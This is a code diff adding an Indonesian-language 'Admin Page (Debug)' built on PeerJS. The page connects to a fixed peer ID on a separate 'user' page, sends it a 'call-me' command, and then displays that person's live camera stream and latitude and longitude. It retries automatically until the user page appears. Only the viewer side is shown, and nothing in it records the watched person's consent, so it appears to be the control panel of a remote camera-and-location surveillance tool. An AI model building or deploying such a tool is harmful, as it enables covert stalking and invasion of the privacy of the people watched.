@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>Halaman Admin - (Debug)</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; background-color: #f4f4f9; }
+        h1, h2 { color: #333; }
+        #container { max-width: 640px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        video { width: 100%; border: 1px solid #ccc; background-color: #000; }
+        #lokasi-remote, #status { margin-top: 15px; font-size: 1.1em; }
+        #status.connected { color: #28a745; }
+        #status.waiting { color: #dc3545; }
+    </style>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+</head>
+<body>
+    <div id="container">
+        <h1>Halaman Admin</h1>
+        <p>Secara otomatis mencari dan menampilkan data dari halaman pengguna.</p>
+        
+        <div id="status" class="waiting">Status: Mencoba terhubung ke pengguna...</div>
+
+        <h2 style="margin-top: 20px;">Video dari Pengguna:</h2>
+        <!-- Perubahan: Tambahkan muted dan playsinline -->
+        <video id="remote-video" autoplay playsinline muted></video>
+        
+        <div id="lokasi-remote">Lokasi Pengguna: Menunggu data...</div>
+    </div>
+
+    <script>
+        const TARGET_PEER_ID = 'layar-utama-pengguna-kamera-v3'; // ID baru yang sama dengan di pengguna
+        const peer = new Peer(); 
+
+        const remoteVideo = document.getElementById('remote-video');
+        const lokasiRemoteDiv = document.getElementById('lokasi-remote');
+        const statusDiv = document.getElementById('status');
+
+        console.log("LOG ADMIN: Skrip dimulai.");
+
+        peer.on('open', (id) => {
+            console.log(`LOG ADMIN: Berhasil terdaftar di server PeerJS dengan ID sendiri: ${id}`);
+            console.log(`LOG ADMIN: Akan mencoba terhubung ke pengguna dengan ID: ${TARGET_PEER_ID}`);
+            connectToUser();
+        });
+
+        function connectToUser() {
+            const conn = peer.connect(TARGET_PEER_ID);
+
+            conn.on('open', () => {
+                console.log("LOG ADMIN: Koneksi data ke pengguna berhasil dibuat (terbuka).");
+                statusDiv.textContent = 'Status: Terhubung! Meminta stream video...';
+                statusDiv.className = 'connected';
+                
+                console.log("LOG ADMIN: Mengirim perintah 'call-me' ke pengguna.");
+                conn.send({ command: 'call-me' });
+
+                conn.on('data', (data) => {
+                    if(data.lat && data.lon) {
+                        lokasiRemoteDiv.innerHTML = `Lokasi Pengguna:<br>Latitude: ${data.lat.toFixed(5)}<br>Longitude: ${data.lon.toFixed(5)}`;
+                    }
+                });
+            });
+            
+            conn.on('error', (err) => {
+                console.error("LOG ADMIN: Error pada koneksi data!", err);
+            });
+        }
+        
+        peer.on('call', (call) => {
+            console.log("LOG ADMIN: Panggilan video masuk diterima dari pengguna!");
+            
+            // Jawab panggilan
+            call.answer(); 
+            
+            call.on('stream', (remoteStream) => {
+                console.log("LOG ADMIN: STREAM VIDEO DITERIMA! Menampilkannya di elemen video.");
+                statusDiv.textContent = 'Status: Stream video diterima!';
+                remoteVideo.srcObject = remoteStream;
+                // Coba putar secara manual untuk memastikan
+                remoteVideo.play().catch(e => console.error("LOG ADMIN: Gagal memutar video secara otomatis:", e));
+            });
+
+            call.on('close', () => {
+                console.log("LOG ADMIN: Panggilan video ditutup oleh pengguna.");
+            });
+             call.on('error', (err) => {
+                console.error("LOG ADMIN: Error pada saat panggilan berlangsung!", err);
+            });
+        });
+
+        peer.on('error', (err) => {
+            console.error("LOG ADMIN: Terjadi error pada PeerJS!", err);
+            if (err.type === 'peer-unavailable') {
+                statusDiv.textContent = 'Status: Pengguna tidak ditemukan. Mencoba lagi dalam 5 detik...';
+                setTimeout(connectToUser, 5000);
+            }
+        });
+    </script>
+</body>
+</html>
